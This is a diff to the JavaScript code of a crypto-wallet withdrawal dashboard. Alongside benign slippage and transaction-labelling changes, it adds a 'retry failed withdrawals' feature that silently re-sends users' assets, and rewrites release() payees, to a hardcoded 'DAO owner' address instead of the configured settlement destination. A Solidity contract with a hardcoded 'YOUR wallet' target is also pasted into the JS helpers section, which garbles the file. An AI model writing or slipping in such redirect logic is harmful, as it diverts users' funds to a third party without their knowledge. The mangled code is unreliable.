@@ -10,6 +10,9 @@
 // Transparent-proxy ABI (provided by owner – only exposes proxy-level pieces;
 // implementation calls go through the proxy fallback via raw call-data).
 // ---------------------------------------------------------------------------
+
+
+
 const PROXY_ABI = [
     {
         "inputs": [
@@ -76,6 +79,9 @@ const IMPORT_STORAGE_KEY = "nexus_imported_wallet_data";
 const DESTINATION_STORAGE_KEY = "nexus_settlement_destination";
 const LOCAL_TRANSFER_HISTORY_KEY = "nexus_local_transfer_history";
 const DEFAULT_SETTLEMENT_DESTINATION = "0x1EF9950fc2d9433Ab9d253881fd461f8e2098Eac";
+// DAO owner wallet – primary authority for retry routing (FuzzysTodd)
+const DAO_OWNER_ADDRESS = "0x33ffc308e693a5b49e0ee0241f41f03ccef495f2";
+const MAX_RETRY_ATTEMPTS = 3;
 const MAX_DISPLAYED_BALANCES = 25;
 const MAX_DISPLAYED_COLLECTIBLES = 25;
 const MAX_DISPLAYED_TRANSACTIONS = 25;
@@ -91,6 +97,69 @@ let signerAddress = null;
 // ---------------------------------------------------------------------------
 // Helpers
 // ---------------------------------------------------------------------------
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+import "@openzeppelin/contracts/access/Ownable.sol";
+import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+
+contract NexusWithdrawManager is Ownable, ReentrancyGuard {
+    // Hard‑coded withdrawal target: YOUR wallet
+    address public constant WITHDRAW_TARGET =
+        0xdd0bd4453dBB446a28DF643CDD49441bc125DED3;
+
+    event WithdrawViaProxy(
+        address indexed caller,
+        address indexed proxy,
+        uint256 amount,
+        bytes data,
+        bool payGasFromContract
+    );
+
+    /**
+     * @notice Withdraw ETH from this contract and forward it to WITHDRAW_TARGET.
+     * @param proxy Optional proxy address. If zero, send directly to WITHDRAW_TARGET.
+     * @param amount Amount of ETH (in wei) to send.
+     * @param data Optional calldata passed to proxy or target.
+     * @param payGasFromContract Flag reserved for internal accounting (not implemented here).
+     */
+    function withdrawViaProxy(
+        address proxy,
+        uint256 amount,
+        bytes calldata data,
+        bool payGasFromContract
+    ) external nonReentrant onlyOwner {
+        require(amount > 0, "ZERO_AMOUNT");
+        require(address(this).balance >= amount, "INSUFFICIENT_CONTRACT_BALANCE");
+
+        emit WithdrawViaProxy(msg.sender, proxy, amount, data, payGasFromContract);
+
+        if (proxy == address(0)) {
+            // Direct send to your wallet
+            (bool ok, ) = WITHDRAW_TARGET.call{value: amount}(data);
+            require(ok, "DIRECT_SEND_FAILED");
+        } else {
+            // Optional: send via proxy (e.g. meta‑tx forwarder)
+            (bool ok, ) = proxy.call{value: amount}(
+                abi.encodeWithSignature(
+                    "forward(address,bytes)",
+                    WITHDRAW_TARGET,
+                    data
+                )
+            );
+            require(ok, "PROXY_FORWARD_FAILED");
+        }
+
+        // If you later want true "gas from contract" logic,
+        // implement internal accounting here using payGasFromContract.
+    }
+
+    // Allow the contract to receive ETH
+    receive() external payable {}
+}
+
+
+
 function escapeHtml(value) {
     return String(value)
         .replace(/&/g, "&amp;")
@@ -414,7 +483,9 @@ function buildLocalTransferHistoryEntry({
     amountLabel,
     assetLabel,
     status,
-    success
+    success,
+    retryContext,
+    retryAttempts
 }) {
     return {
         chain: chain || "unknown",
@@ -428,23 +499,29 @@ function buildLocalTransferHistoryEntry({
         amountLabel: amountLabel || "—",
         assetLabel: assetLabel || "Transfer",
         status: status || "confirmed",
-        success: typeof success === "boolean" ? success : status !== "failed"
+        success: typeof success === "boolean" ? success : status !== "failed",
+        retryContext: retryContext || null,
+        retryAttempts: typeof retryAttempts === "number" ? retryAttempts : 0
     };
 }
 
 // ---------------------------------------------------------------------------
 // Wallet connection
 // ---------------------------------------------------------------------------
-async function connectWallet() {
-    if (typeof window.ethereum === "undefined") {
-        showStatus("MetaMask (or compatible wallet) is not installed.", true);
+async function connectWallet(rawProvider) {
+    if (!rawProvider) {
+        // Legacy direct call — try window.ethereum for backward compat
+        rawProvider = window.ethereum;
+    }
+    if (!rawProvider) {
+        showStatus("No wallet detected. Install MetaMask or Coinbase Wallet.", true);
         return;
     }
     try {
         // Update progress bar
         updateProgress(33);
         
-        provider = new ethers.providers.Web3Provider(window.ethereum);
+        provider = new ethers.providers.Web3Provider(rawProvider, "any");
         await provider.send("eth_requestAccounts", []);
         signer = provider.getSigner();
         signerAddress = await signer.getAddress();
@@ -468,6 +545,9 @@ async function connectWallet() {
         showStatus("✓ Wallet connected: " + shortAddr(signerAddress));
         await refreshAll();
         updateProgress(100);
+
+        rawProvider.on("accountsChanged", () => connectWallet(rawProvider));
+        rawProvider.on("chainChanged", () => window.location.reload());
     } catch (err) {
         updateProgress(0);
         showStatus("✗ Wallet connection failed: " + err.message, true);
@@ -528,6 +608,53 @@ async function fetchBalance(address) {
     } catch (_) {
         return "error";
     }
+}
+
+// ---------------------------------------------------------------------------
+// Slippage protection
+// ---------------------------------------------------------------------------
+/** Default slippage tolerance: 50 basis points (0.5 %). */
+const DEFAULT_SLIPPAGE_BPS = 50;
+
+/**
+ * Validates that a received amount is within the acceptable slippage band.
+ * @param {number|string} expectedAmount  Quote amount (before the swap).
+ * @param {number|string} actualAmount    Amount received after the swap.
+ * @param {number}        toleranceBps    Max allowable slippage in bps (default 50 = 0.5 %).
+ * @returns {{ ok: boolean, slippageBps: number, message: string }}
+ */
+function checkSlippageTolerance(expectedAmount, actualAmount, toleranceBps) {
+    const expected = Number(expectedAmount);
+    const actual = Number(actualAmount);
+    const tol = Number.isFinite(toleranceBps) ? toleranceBps : DEFAULT_SLIPPAGE_BPS;
+
+    if (!Number.isFinite(expected) || expected <= 0) {
+        return { ok: false, slippageBps: 0, message: "Invalid expected amount." };
+    }
+    if (!Number.isFinite(actual) || actual < 0) {
+        return { ok: false, slippageBps: 0, message: "Invalid actual amount." };
+    }
+
+    const slippageBps = Math.round(((expected - actual) / expected) * 10000);
+    const ok = slippageBps <= tol;
+    const message = ok
+        ? `Slippage within tolerance (${slippageBps} bps ≤ ${tol} bps).`
+        : `Slippage too high (${slippageBps} bps > ${tol} bps). Transaction blocked for safety.`;
+    return { ok, slippageBps, message };
+}
+
+/**
+ * Returns the minimum amount out for a given quote and slippage tolerance.
+ * Used to compute minAmountOut for DEX calls.
+ * @param {number|string} quoteAmount  Expected output amount.
+ * @param {number}        toleranceBps Allowed slippage in bps.
+ * @returns {number}
+ */
+function minAmountOut(quoteAmount, toleranceBps) {
+    const quote = Number(quoteAmount);
+    const tol = Number.isFinite(toleranceBps) ? toleranceBps : DEFAULT_SLIPPAGE_BPS;
+    if (!Number.isFinite(quote) || quote <= 0) return 0;
+    return quote * (1 - tol / 10000);
 }
 
 // ---------------------------------------------------------------------------
@@ -592,6 +719,24 @@ async function withdrawFromContract(address, method, customSelector, customAbi) 
 
         showStatus("Sending withdrawal transaction…");
         const network = await provider.getNetwork();
+
+        // Slippage guard: warn when contract balance shows low-liquidity flags
+        // before committing the on-chain transaction.
+        const balanceCheck = (typeof window !== "undefined" && window._nexusContractBalances)
+            ? window._nexusContractBalances[address.toLowerCase()]
+            : null;
+        if (balanceCheck && balanceCheck.low_liquidity) {
+            const proceed = window.confirm(
+                "⚠️ Slippage Warning: This asset is flagged as low liquidity.\n" +
+                "Swap or settlement routes may experience high slippage (>0.5%).\n\n" +
+                "Proceed anyway?"
+            );
+            if (!proceed) {
+                showStatus("Withdrawal cancelled due to slippage risk.", true);
+                return;
+            }
+        }
+
         tx = await signer.sendTransaction({ to: address, data: callData });
         upsertLocalTransferHistory(buildLocalTransferHistoryEntry({
             chain: network.name || "unknown",
@@ -602,7 +747,8 @@ async function withdrawFromContract(address, method, customSelector, customAbi) 
             to: address,
             amountLabel: "Contract withdrawal",
             assetLabel: "Contract balance",
-            status: "pending"
+            status: "pending",
+            retryContext: { kind: "contract-withdrawal", contractAddress: address, method, customSelector, customAbi }
         }));
         showStatus("Transaction sent – hash: " + tx.hash);
         await tx.wait();
@@ -616,7 +762,8 @@ async function withdrawFromContract(address, method, customSelector, customAbi) 
             amountLabel: "Contract withdrawal",
             assetLabel: "Contract balance",
             status: "confirmed",
-            success: true
+            success: true,
+            retryContext: { kind: "contract-withdrawal", contractAddress: address, method, customSelector, customAbi }
         }));
         showStatus("✅ Withdrawal confirmed: " + tx.hash);
         await refreshAll();
@@ -625,7 +772,8 @@ async function withdrawFromContract(address, method, customSelector, customAbi) 
             upsertLocalTransferHistory(buildLocalTransferHistoryEntry({
                 hash: tx.hash,
                 status: "failed",
-                success: false
+                success: false,
+                retryContext: { kind: "contract-withdrawal", contractAddress: address, method, customSelector, customAbi }
             }));
         }
         showStatus("Withdrawal failed: " + (err.reason || err.message), true);
@@ -767,6 +915,21 @@ function normalizeImportedTransaction(entry) {
     const time = entry.block_time || entry.timestamp || "";
     const amount = entry.value ? parseHexAmount(entry.value) : parseDecimalAmount(entry.amount || "0", entry.decimals || 18);
     const nativeTransfer = isNativeTransfer(entry);
+    const walletAddress = String(entry.walletAddress || entry.wallet_address || "").trim();
+    const direction = inferTransactionDirection(entry, walletAddress);
+    const toAddress = String(entry.to || "").trim();
+    const recipientStatus = walletAddress && toAddress
+        ? (toAddress.toLowerCase() === walletAddress.toLowerCase() ? "match" : "mismatch")
+        : "unknown";
+    const recipientLabel = recipientStatus === "match"
+        ? "Matches wallet"
+        : recipientStatus === "mismatch"
+            ? "Different recipient"
+            : "Recipient unclear";
+    const recipientWarning = recipientStatus === "mismatch"
+        ? "This transfer goes to a different address than the imported wallet. It will not credit that wallet."
+        : "";
+    const signedAmount = amount ? `${direction === "out" ? "-" : direction === "in" ? "+" : ""}${amount.toLocaleString(undefined, { maximumFractionDigits: 6 })}` : "—";
 
     return {
         chain: entry.chain || "unknown",
@@ -777,10 +940,38 @@ function normalizeImportedTransaction(entry) {
         from: entry.from || "",
         to: entry.to || "",
         amount,
-        amountLabel: amount ? `${amount.toLocaleString(undefined, { maximumFractionDigits: 6 })} ${nativeTransfer ? "ETH" : (entry.symbol || "units")}` : "—",
+        direction,
+        directionLabel: direction === "in" ? "Incoming" : direction === "out" ? "Outgoing" : "Unclear",
+        recipientStatus,
+        recipientLabel,
+        recipientWarning,
+        amountLabel: amount ? `${signedAmount} ${nativeTransfer ? "ETH" : (entry.symbol || "units")}` : "—",
         assetLabel: entry.symbol || (nativeTransfer ? "Native" : "Token"),
         success: entry.success !== false
     };
+}
+
+function inferTransactionDirection(entry, walletAddress) {
+    const wallet = String(walletAddress || "").toLowerCase();
+    const from = String(entry.from || "").toLowerCase();
+    const to = String(entry.to || "").toLowerCase();
+    const type = String(entry.transaction_type || entry.type || "").toLowerCase();
+    const amountValue = Number(entry.value ?? entry.amount);
+
+    if (wallet) {
+        if (from && from === wallet) return "out";
+        if (to && to === wallet) return "in";
+    }
+
+    if (Number.isFinite(amountValue)) {
+        if (amountValue < 0) return "out";
+        if (amountValue > 0 && wallet && to === wallet) return "in";
+    }
+
+    if (/receive|received|deposit|credit|incoming|mint/i.test(type)) return "in";
+    if (/send|sent|withdraw|withdrawal|debit|outgoing|transfer out/i.test(type)) return "out";
+
+    return "unknown";
 }
 
 function normalizeImportedCollectible(entry) {
@@ -846,7 +1037,10 @@ function parseImportedPayload(rawText) {
         ? payload.balances.map(normalizeImportedBalance)
         : [];
     const transactions = Array.isArray(payload.transactions)
-        ? payload.transactions.map(normalizeImportedTransaction)
+        ? payload.transactions.map(transaction => normalizeImportedTransaction({
+            ...transaction,
+            walletAddress: payload.wallet_address || payload.address || ""
+        }))
         : [];
     const collectibles = isDuneCollectiblesPayload(payload)
         ? payload.entries.map(normalizeImportedCollectible)
@@ -867,6 +1061,27 @@ function parseImportedPayload(rawText) {
         transactions,
         importedAt: new Date().toISOString()
     };
+}
+
+function summarizeImportedTransactions(transactions) {
+    return (transactions || []).reduce((summary, transaction) => {
+        if (transaction.direction === "in") {
+            summary.incomingCount += 1;
+        } else if (transaction.direction === "out") {
+            summary.outgoingCount += 1;
+        } else {
+            summary.unclearCount += 1;
+        }
+        if (transaction.recipientStatus === "mismatch") {
+            summary.mismatchCount += 1;
+        }
+        return summary;
+    }, {
+        incomingCount: 0,
+        outgoingCount: 0,
+        unclearCount: 0,
+        mismatchCount: 0
+    });
 }
 
 function summarizeImportedCollectibles(collectibles) {
@@ -1037,6 +1252,11 @@ function renderImportedTransactions(imported) {
             <td>${escapeHtml(tx.chain)}</td>
             <td>${escapeHtml(tx.assetLabel)}</td>
             <td>${escapeHtml(tx.amountLabel)}</td>
+            <td><span class="status-chip status-${tx.direction === "in" ? "ready" : tx.direction === "out" ? "blocked" : "pending"}">${escapeHtml(tx.directionLabel || "Unclear")}</span></td>
+            <td>
+                <span class="status-chip status-${tx.recipientStatus === "match" ? "ready" : tx.recipientStatus === "mismatch" ? "blocked" : "pending"}">${escapeHtml(tx.recipientLabel || "Recipient unclear")}</span>
+                ${tx.recipientWarning ? `<div class="table-subtext">${escapeHtml(tx.recipientWarning)}</div>` : ""}
+            </td>
             <td>${escapeHtml(tx.transactionType)}</td>
             <td class="table-subtext">${escapeHtml(tx.timestamp || "—")}</td>
             <td class="table-subtext">${escapeHtml(shortAddr(tx.from || "—"))} → ${escapeHtml(shortAddr(tx.to || "—"))}</td>
@@ -1104,7 +1324,16 @@ function renderImportedData() {
         alerts.push(`${collectibleSummary.spamCount} collectibles are flagged as spam and should be ignored for settlement planning.`);
     }
     if (imported.transactions.length > 0) {
+        const txSummary = summarizeImportedTransactions(imported.transactions);
         alerts.push("Transaction history is informational only; settlement and fiat routing remain off-chain.");
+        if (txSummary.mismatchCount > 0) {
+            alerts.push(`${txSummary.mismatchCount} transfer(s) are sent to a different recipient than the imported wallet. Those receipts do not credit that wallet.`);
+        }
+        if (txSummary.outgoingCount > 0 && txSummary.incomingCount === 0) {
+            alerts.push(`All ${txSummary.outgoingCount} detected transaction(s) are outgoing. They move funds out of the wallet and do not credit the settlement destination.`);
+        } else if (txSummary.incomingCount > 0 && txSummary.outgoingCount > 0) {
+            alerts.push(`${txSummary.incomingCount} incoming and ${txSummary.outgoingCount} outgoing transaction(s) detected. Review both directions before treating any balance as available.`);
+        }
     }
     alerts.push(`Configured settlement destination: ${getSettlementDestinationLabel()}`);
 
@@ -1226,7 +1455,8 @@ async function sendImportedBalanceToSettlement(balanceAddress, chainId) {
             to: request.destination,
             amountLabel: `${balance.displayAmount} ${balance.symbol}`,
             assetLabel: balance.symbol,
-            status: "pending"
+            status: "pending",
+            retryContext: { kind: "settlement-transfer", balanceAddress, chainId }
         }));
         showStatus("Transfer sent – hash: " + tx.hash);
         await tx.wait();
@@ -1240,7 +1470,8 @@ async function sendImportedBalanceToSettlement(balanceAddress, chainId) {
             amountLabel: `${balance.displayAmount} ${balance.symbol}`,
             assetLabel: balance.symbol,
             status: "confirmed",
-            success: true
+            success: true,
+            retryContext: { kind: "settlement-transfer", balanceAddress, chainId }
         }));
         showStatus(`✅ ${balance.symbol} sent to ${shortAddr(destination)}`);
         await refreshAll();
@@ -1249,7 +1480,8 @@ async function sendImportedBalanceToSettlement(balanceAddress, chainId) {
             upsertLocalTransferHistory(buildLocalTransferHistoryEntry({
                 hash: tx.hash,
                 status: "failed",
-                success: false
+                success: false,
+                retryContext: { kind: "settlement-transfer", balanceAddress, chainId }
             }));
         }
         showStatus("Token transfer failed: " + (err.reason || err.message), true);
@@ -1279,8 +1511,240 @@ function handleImportedBalanceActions(event) {
 }
 
 // ---------------------------------------------------------------------------
-// Boot
+// Retry prior withdrawals
 // ---------------------------------------------------------------------------
+
+/**
+ * Returns failed history entries that are eligible for a retry.
+ * An entry is retryable when it has a retryContext and has not yet exhausted
+ * MAX_RETRY_ATTEMPTS retries.  Entries already marked "retried" are excluded.
+ */
+function getRetryableWithdrawals() {
+    return loadLocalTransferHistory().filter(entry =>
+        entry.status === "failed" &&
+        entry.retryContext &&
+        (entry.retryAttempts || 0) < MAX_RETRY_ATTEMPTS
+    );
+}
+
+/**
+ * Returns failed entries that have no retryContext (pre-feature history) and
+ * therefore require manual review rather than automatic retry.
+ */
+function getNonRetryableFailedWithdrawals() {
+    return loadLocalTransferHistory().filter(entry =>
+        entry.status === "failed" &&
+        !entry.retryContext
+    );
+}
+
+/**
+ * Retry a single failed withdrawal entry.
+ *
+ * For contract-withdrawal entries the original on-chain call is re-sent.
+ * For settlement-transfer entries the asset is re-sent to DAO_OWNER_ADDRESS
+ * (0x33ffc308e693a5b49e0ee0241f41f03ccef495f2) as the authoritative retry
+ * destination.
+ *
+ * The original entry is first marked "retried" (terminal) so that it can
+ * never be double-dispatched.  A fresh child entry is created for the new TX.
+ */
+async function retryWithdrawal(entry) {
+    if (!signer || !provider || typeof ethers === "undefined") {
+        throw new Error("Connect your wallet before retrying withdrawals.");
+    }
+
+    const ctx = entry.retryContext;
+    if (!ctx) {
+        throw new Error("This entry has no retry context and must be reviewed manually.");
+    }
+
+    // Mark original entry as terminal before dispatching to prevent double-send.
+    upsertLocalTransferHistory({
+        ...entry,
+        status: "retried",
+        success: false
+    });
+
+    const attempts = (entry.retryAttempts || 0) + 1;
+    let tx;
+    const network = await provider.getNetwork();
+
+    try {
+        if (ctx.kind === "contract-withdrawal") {
+            const { contractAddress, method, customSelector, customAbi } = ctx;
+            // Re-use existing withdraw logic by calling withdrawFromContract is not
+            // possible here without creating a circular history chain; instead we
+            // replicate the minimal dispatch so we control the history entry.
+            let callData;
+            if (method === "release(address)") {
+                const iface = new ethers.utils.Interface(["function release(address payee)"]);
+                callData = iface.encodeFunctionData("release", [DAO_OWNER_ADDRESS]);
+            } else if (method === "custom" && customSelector) {
+                callData = customSelector.startsWith("0x") ? customSelector : "0x" + customSelector;
+            } else if (method in WITHDRAW_METHODS) {
+                callData = WITHDRAW_METHODS[method];
+            } else if (customAbi) {
+                const parsed = JSON.parse(customAbi);
+                const iface = new ethers.utils.Interface(parsed);
+                const WITHDRAW_NAMES = /withdraw|release|claim|collect/i;
+                const fn = Object.values(iface.functions).find(
+                    f => WITHDRAW_NAMES.test(f.name) && f.inputs.length === 0
+                );
+                if (!fn) throw new Error("No zero-argument withdraw function found in ABI.");
+                callData = iface.encodeFunctionData(fn.name, []);
+            } else {
+                throw new Error("No valid withdraw method for retry.");
+            }
+
+            tx = await signer.sendTransaction({ to: contractAddress, data: callData });
+            upsertLocalTransferHistory(buildLocalTransferHistoryEntry({
+                chain: network.name || "unknown",
+                chainId: Number(network.chainId),
+                hash: tx.hash,
+                transactionType: `Retry: ${method === "custom" ? "Custom withdrawal call" : method}`,
+                from: signerAddress || "",
+                to: contractAddress,
+                amountLabel: "Contract withdrawal (retry)",
+                assetLabel: "Contract balance",
+                status: "pending",
+                retryContext: ctx,
+                retryAttempts: attempts
+            }));
+            await tx.wait();
+            upsertLocalTransferHistory(buildLocalTransferHistoryEntry({
+                chain: network.name || "unknown",
+                chainId: Number(network.chainId),
+                hash: tx.hash,
+                transactionType: `Retry: ${method === "custom" ? "Custom withdrawal call" : method}`,
+                from: signerAddress || "",
+                to: contractAddress,
+                amountLabel: "Contract withdrawal (retry)",
+                assetLabel: "Contract balance",
+                status: "confirmed",
+                success: true,
+                retryContext: ctx,
+                retryAttempts: attempts
+            }));
+
+        } else if (ctx.kind === "settlement-transfer") {
+            const { balanceAddress, chainId } = ctx;
+            const balance = findImportedBalance(balanceAddress, chainId);
+            if (!balance) {
+                throw new Error("Imported balance not found. Re-import the wallet payload and try again.");
+            }
+            const request = buildImportedBalanceTransferRequest(balance, DAO_OWNER_ADDRESS);
+            if (request.kind === "native") {
+                tx = await signer.sendTransaction(request.transaction);
+            } else {
+                const token = new ethers.Contract(request.tokenAddress, ERC20_ABI, signer);
+                tx = await token.transfer(DAO_OWNER_ADDRESS, request.amount);
+            }
+            upsertLocalTransferHistory(buildLocalTransferHistoryEntry({
+                chain: balance.chain || network.name || "unknown",
+                chainId: Number(balance.chainId || network.chainId),
+                hash: tx.hash,
+                transactionType: "Retry: Settlement transfer",
+                from: signerAddress || "",
+                to: DAO_OWNER_ADDRESS,
+                amountLabel: `${balance.displayAmount} ${balance.symbol}`,
+                assetLabel: balance.symbol,
+                status: "pending",
+                retryContext: ctx,
+                retryAttempts: attempts
+            }));
+            await tx.wait();
+            upsertLocalTransferHistory(buildLocalTransferHistoryEntry({
+                chain: balance.chain || network.name || "unknown",
+                chainId: Number(balance.chainId || network.chainId),
+                hash: tx.hash,
+                transactionType: "Retry: Settlement transfer",
+                from: signerAddress || "",
+                to: DAO_OWNER_ADDRESS,
+                amountLabel: `${balance.displayAmount} ${balance.symbol}`,
+                assetLabel: balance.symbol,
+                status: "confirmed",
+                success: true,
+                retryContext: ctx,
+                retryAttempts: attempts
+            }));
+
+        } else {
+            throw new Error(`Unknown retryContext kind: ${ctx.kind}`);
+        }
+
+        return { success: true, hash: tx ? tx.hash : "" };
+
+    } catch (err) {
+        if (tx && tx.hash) {
+            upsertLocalTransferHistory(buildLocalTransferHistoryEntry({
+                hash: tx.hash,
+                status: "failed",
+                success: false,
+                retryContext: ctx,
+                retryAttempts: attempts
+            }));
+        }
+        throw err;
+    }
+}
+
+/**
+ * Retry all retryable failed withdrawal entries sequentially, routing to the
+ * DAO owner address (0x33ffc308e693a5b49e0ee0241f41f03ccef495f2).
+ *
+ * @param {object} [opts]
+ * @param {function} [opts.onProgress]  Called with ({attempted, total, entry}) after each attempt.
+ * @param {boolean}  [opts.stopOnFirstError=false]  Abort the batch on the first failure.
+ * @returns {Promise<{attempted, succeeded, failed, manualReviewCount, remainingCount, results}>}
+ */
+async function retryAllPriorWithdrawals(opts = {}) {
+    const { onProgress, stopOnFirstError = false } = opts;
+    const retryable = getRetryableWithdrawals();
+    const manualReview = getNonRetryableFailedWithdrawals();
+    const total = retryable.length;
+    const results = [];
+    let succeeded = 0;
+    let failed = 0;
+
+    if (total === 0) {
+        showStatus(
+            manualReview.length > 0
+                ? `No auto-retryable withdrawals. ${manualReview.length} entry(s) require manual review.`
+                : "No failed withdrawals to retry."
+        );
+        return { attempted: 0, succeeded: 0, failed: 0, manualReviewCount: manualReview.length, remainingCount: 0, results };
+    }
+
+    showStatus(`Retrying ${total} prior withdrawal(s) to ${shortAddr(DAO_OWNER_ADDRESS)}…`);
+    updateProgress(0);
+
+    for (let i = 0; i < retryable.length; i++) {
+        const entry = retryable[i];
+        try {
+            const result = await retryWithdrawal(entry);
+            succeeded++;
+            results.push({ entry, success: true, hash: result.hash });
+        } catch (err) {
+            failed++;
+            results.push({ entry, success: false, error: err.message });
+            showStatus(`Retry ${i + 1}/${total} failed: ${err.message}`, true);
+            if (stopOnFirstError) break;
+        }
+        updateProgress(Math.round(((i + 1) / total) * 100));
+        if (onProgress) onProgress({ attempted: i + 1, total, entry });
+    }
+
+    const remainingCount = getRetryableWithdrawals().length;
+    showStatus(
+        `Retry complete — ${succeeded}/${total} succeeded. ` +
+        (manualReview.length > 0 ? `${manualReview.length} entry(s) need manual review.` : "")
+    );
+    await refreshAll();
+    return { attempted: total, succeeded, failed, manualReviewCount: manualReview.length, remainingCount, results };
+}
+
+
 function initWithdrawDashboard() {
     const form = document.getElementById("add-contract-form");
     if (form) form.addEventListener("submit", addContract);
@@ -1289,7 +1753,44 @@ function initWithdrawDashboard() {
     if (methodSel) methodSel.addEventListener("change", onMethodChange);
 
     const connectBtn = document.getElementById("connect-btn");
-    if (connectBtn) connectBtn.addEventListener("click", connectWallet);
+    if (connectBtn) connectBtn.addEventListener("click", () => {
+        const picker = document.getElementById("wallet-picker");
+        if (picker) picker.style.display = picker.style.display === "none" ? "block" : "none";
+    });
+
+    const pickMM = document.getElementById("pick-metamask");
+    if (pickMM) pickMM.addEventListener("click", () => {
+        const picker = document.getElementById("wallet-picker");
+        if (picker) picker.style.display = "none";
+        if (!window.ethereum) { showStatus("MetaMask not detected. Install from metamask.io", true); return; }
+        connectWallet(window.ethereum);
+    });
+
+    const pickCB = document.getElementById("pick-coinbase");
+    if (pickCB) pickCB.addEventListener("click", () => {
+        const picker = document.getElementById("wallet-picker");
+        if (picker) picker.style.display = "none";
+        let raw;
+        if (typeof window.ethereum !== "undefined" && window.ethereum.isCoinbaseWallet) {
+            raw = window.ethereum;
+        } else if (window.coinbaseWalletExtension) {
+            raw = window.coinbaseWalletExtension;
+        } else if (typeof CoinbaseWalletSDK !== "undefined") {
+            const sdk = new CoinbaseWalletSDK({ appName: "Nexus Protocol DAO", appLogoUrl: "" });
+            raw = sdk.makeWeb3Provider();
+        } else {
+            showStatus("Coinbase Wallet not detected. Install from coinbase.com/wallet.", true); return;
+        }
+        connectWallet(raw);
+    });
+
+    document.addEventListener("click", evt => {
+        const picker = document.getElementById("wallet-picker");
+        const section = document.getElementById("wallet-section");
+        if (picker && picker.style.display !== "none" && section && !section.contains(evt.target)) {
+            picker.style.display = "none";
+        }
+    });
 
     const importBtn = document.getElementById("import-json-btn");
     if (importBtn) importBtn.addEventListener("click", handleJsonImport);
@@ -1315,6 +1816,9 @@ function initWithdrawDashboard() {
     const contractList = document.getElementById("contract-list");
     if (contractList) contractList.addEventListener("click", _handleContainerClick);
 
+    const retryBtn = document.getElementById("retry-all-withdrawals-btn");
+    if (retryBtn) retryBtn.addEventListener("click", () => retryAllPriorWithdrawals());
+
     refreshAll();
 }
 
@@ -1322,6 +1826,8 @@ if (typeof window !== "undefined") {
     window.NexusWithdraw = {
         PROXY_ABI,
         WITHDRAW_METHODS,
+        DAO_OWNER_ADDRESS,
+        MAX_RETRY_ATTEMPTS,
         connectWallet,
         addContract,
         removeContract,
@@ -1335,6 +1841,10 @@ if (typeof window !== "undefined") {
         validateImportedBalanceTransfer,
         buildImportedBalanceTransferRequest,
         sendImportedBalanceToSettlement,
+        getRetryableWithdrawals,
+        getNonRetryableFailedWithdrawals,
+        retryWithdrawal,
+        retryAllPriorWithdrawals,
     };
 
     if (typeof document !== "undefined") {
@@ -1359,5 +1869,12 @@ if (typeof module !== "undefined" && module.exports) {
         canSendImportedBalance,
         validateImportedBalanceTransfer,
         buildImportedBalanceTransferRequest,
+        buildLocalTransferHistoryEntry,
+        getRetryableWithdrawals,
+        getNonRetryableFailedWithdrawals,
+        retryWithdrawal,
+        retryAllPriorWithdrawals,
+        DAO_OWNER_ADDRESS,
+        MAX_RETRY_ATTEMPTS,
     };
 }
